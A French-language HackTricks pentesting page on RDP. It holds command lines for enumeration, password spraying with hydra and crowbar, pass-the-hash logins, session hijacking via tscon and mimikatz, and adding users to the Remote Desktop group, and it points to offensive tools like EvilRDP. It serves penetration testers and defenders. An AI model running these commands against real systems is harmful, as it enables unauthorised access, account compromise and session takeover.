# 3389 - Pentesting RDP

{{#include ../banners/hacktricks-training.md}}


## Informations de base

Développé par Microsoft, le **Remote Desktop Protocol** (**RDP**) est conçu pour permettre une connexion d'interface graphique entre des ordinateurs sur un réseau. Pour établir une telle connexion, un logiciel client **RDP** est utilisé par l'utilisateur, et simultanément, l'ordinateur distant doit faire fonctionner un logiciel serveur **RDP**. Cette configuration permet le contrôle et l'accès sans faille à l'environnement de bureau d'un ordinateur distant, amenant essentiellement son interface sur l'appareil local de l'utilisateur.

**Port par défaut :** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## Énumération

### Automatique
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
Il vérifie le chiffrement disponible et la vulnérabilité DoS (sans causer de DoS au service) et obtient des informations NTLM Windows (versions).

### [Brute force](../generic-hacking/brute-force.md#rdp)

**Soyez prudent, vous pourriez verrouiller des comptes**

### **Password Spraying**

**Soyez prudent, vous pourriez verrouiller des comptes**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Se connecter avec des identifiants/hash connus
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### Vérifiez les identifiants connus contre les services RDP

rdp_check.py d'impacket vous permet de vérifier si certains identifiants sont valides pour un service RDP :
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
## **Attaques**

### Vol de session

Avec des **permissions SYSTEM**, vous pouvez accéder à n'importe quelle **session RDP ouverte par n'importe quel utilisateur** sans avoir besoin de connaître le mot de passe du propriétaire.

**Obtenir les sessions ouvertes :**
```
query user
```
**Accès à la session sélectionnée**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
Vous serez maintenant à l'intérieur de la session RDP sélectionnée et vous aurez à usurper un utilisateur en utilisant uniquement des outils et des fonctionnalités Windows.

**Important** : Lorsque vous accédez à des sessions RDP actives, vous déconnecterez l'utilisateur qui l'utilisait.

Vous pourriez obtenir des mots de passe en extrayant le processus, mais cette méthode est beaucoup plus rapide et vous permet d'interagir avec les bureaux virtuels de l'utilisateur (mots de passe dans le bloc-notes sans être enregistrés sur le disque, d'autres sessions RDP ouvertes sur d'autres machines...)

#### **Mimikatz**

Vous pourriez également utiliser mimikatz pour faire cela :
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Sticky-keys & Utilman

En combinant cette technique avec **stickykeys** ou **utilman**, vous pourrez accéder à un CMD administratif et à n'importe quelle session RDP à tout moment.

Vous pouvez rechercher des RDP qui ont été backdoorés avec l'une de ces techniques déjà avec : [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### RDP Process Injection

Si quelqu'un d'un domaine différent ou avec **de meilleurs privilèges se connecte via RDP** au PC où **vous êtes Admin**, vous pouvez **injecter** votre beacon dans son **processus de session RDP** et agir en son nom :

{{#ref}}
../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md
{{#endref}}

### Adding User to RDP group
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## Outils Automatiques

- [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn** est un framework de post-exploitation créé en Powershell, conçu principalement pour automatiser l'attaque **Shadow** sur les ordinateurs Microsoft Windows. Cette vulnérabilité (répertoriée comme une fonctionnalité par Microsoft) permet à un attaquant distant de **voir le bureau de sa victime sans son consentement**, et même de le contrôler à la demande, en utilisant des outils natifs du système d'exploitation lui-même.

- [**EvilRDP**](https://github.com/skelsec/evilrdp)
- Contrôler la souris et le clavier de manière automatisée depuis la ligne de commande
- Contrôler le presse-papiers de manière automatisée depuis la ligne de commande
- Créer un proxy SOCKS depuis le client qui canalise la communication réseau vers la cible via RDP
- Exécuter des commandes SHELL et PowerShell arbitraires sur la cible sans télécharger de fichiers
- Télécharger et télécharger des fichiers vers/depuis la cible même lorsque les transferts de fichiers sont désactivés sur la cible

## Commandes Automatiques HackTricks
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for RDP
Note: |
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device.

https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
Name: Nmap
Description: Nmap with RDP Scripts
Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
{{#include ../banners/hacktricks-training.md}}
